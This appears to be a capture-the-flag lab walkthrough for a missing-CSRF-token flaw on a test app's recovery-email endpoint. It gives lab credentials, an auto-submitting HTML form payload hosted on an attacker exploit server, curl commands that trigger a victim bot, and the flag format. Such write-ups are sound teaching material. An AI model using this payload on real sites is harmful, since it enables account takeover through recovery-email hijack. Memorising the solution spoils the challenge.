# CSRF — MissingToken · Mailgard (difficulty: low)

Mailgard's account settings let a logged-in user change their **recovery email** via `POST /account/recovery-email`. The endpoint has **zero CSRF protection**: no token, no origin/referer validation, no custom-header requirement. Any page the victim visits in their logged-in browser can silently submit this state change with the victim's session cookie — classic "attackless" account takeover prep (whoever controls the recovery email can request password resets).

Intended path:
1. Log in at http://victim.target.lab:8119/ as `0xnhsec` / `vlh-tester-01` and open http://victim.target.lab:8119/account — inspect the form: there is no token field at all.
2. Store the exploit artifact on the exploit server (`PUT http://attacker.target.lab:8119/pages/exploit.html`): `<form action="http://victim.target.lab:8119/account/recovery-email" method="POST"><input name="recovery_email" value="attacker@evil.example"></form><script>document.forms[0].submit()</script>`
3. Trigger the victim bot (it carries the innocent's session): `curl -X POST http://collector.target.lab:8119/victim -H 'Content-Type: application/json' -d '{"url":"http://victim.target.lab:8119/account/recovery-email","method":"POST","body":{"recovery_email":"attacker@evil.example"}}'`
4. `curl http://collector.target.lab:8119/verify` — the checker observes the innocent's `recovery_email` row changed from its seed value and mints the flag.

Flag: `DSLTV{CSRF-MissingToken-<9-10 digits>}` (event-verified — minted by the verifier, regenerated every restart).
